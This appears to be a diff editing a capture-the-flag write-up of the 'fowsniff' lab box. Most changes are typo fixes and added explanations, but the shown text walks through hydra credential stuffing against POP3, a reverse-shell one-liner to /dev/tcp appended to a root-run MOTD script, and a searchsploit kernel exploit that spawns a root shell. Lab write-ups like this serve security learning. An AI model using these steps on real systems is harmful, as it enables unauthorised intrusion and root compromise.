@@ -156,6 +156,8 @@ Alas, we see 9 attempts and none of those seem to work.
 
 ##### Credential Stuffing against `pop3`
 
+You might remember that `nmap` showed that port `110` was open, which is the POP3 port. Hydra does know how to log into that service, so we can do credential stuffing here, too:
+
 ```bash
 hydra -C ./accounts.txt -vV 10.10.10.10 pop3
 ```
@@ -166,7 +168,7 @@ We have ONE account (`seina`) that does have a working password. That should mea
 
 Post Office Protocol v3 (POP3) is a very old protocol from the 1980's(?) where everything is text-based. In this case, we're going to connect to port `110` and issue a series of commands. Here's a summary:
 
-1. Initiate a connect with Netcat via `nc $TARGET 110`
+1. Initiate a connection with Netcat via `nc $TARGET 110`
 1. Type: `USER seina` <kbd>Enter</kbd>
 1. Type: `PASS <The Password You Retrieved>` <kbd>Enter</kbd>
 1. Type: `LIST` <kbd>Enter</kbd>
@@ -318,12 +320,12 @@ There are at least two ways to get `root` on this box.
 Since we have the ability to modify this `cube.sh` file, what if we had a kill-chain of:
 
 1. Start Netcat listening on our machine on port 9000 via `nc -lvnp 9000`
-2. Add a one-liner reverse shell to the end of this file, like: `sh -i >& /dev/tcp/10.6.90.119/9000 0>&1`
+2. Add a [one-liner reverse shell](https://www.revshells.com/) to the end of this file, like: `sh -i >& /dev/tcp/10.6.90.119/9000 0>&1`
 3. Login via SSH again to trigger the reverse shell to run.
 
 In theory, the SSH login should trigger the Message of the Day (MOTD), which should run `cube.sh` (as `root`) which should create a reverse shell connection to our awaiting Netcat.
 
-#### OPTION 2: Use ExploitDB to take advange of old OS kernel
+#### OPTION 2: Use ExploitDB to take advantage of old OS kernel
 
 In this approach, we see the OS information and the Linux Kernel information:
 
@@ -357,7 +359,9 @@ and
 Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-respectively. So, we know we're running **Ubuntu 16.04.4** and Linux Kernel version **4.4.0-116**. We can search for that in ExploitDB or via the CLI via `searchsploit`:
+respectively. So, we know we're running **Ubuntu 16.04.4** and Linux Kernel version **4.4.0-116** - both of these are from the year 2016.
+
+We can search for that in ExploitDB or via the CLI via `searchsploit`:
 
 ```bash
 searchsploit linux kernel 4.4.0-116
@@ -406,7 +410,7 @@ The kill-chain here would be:
 We see this output:
 
 ```bash
-baksteen@fowsniff:~$ ./44298-exploit.1 
+baksteen@fowsniff:~$ ./44298-exploit
 task_struct = ffff88001f28c600
 uidptr = ffff880015f3d6c4
 spawning root shell
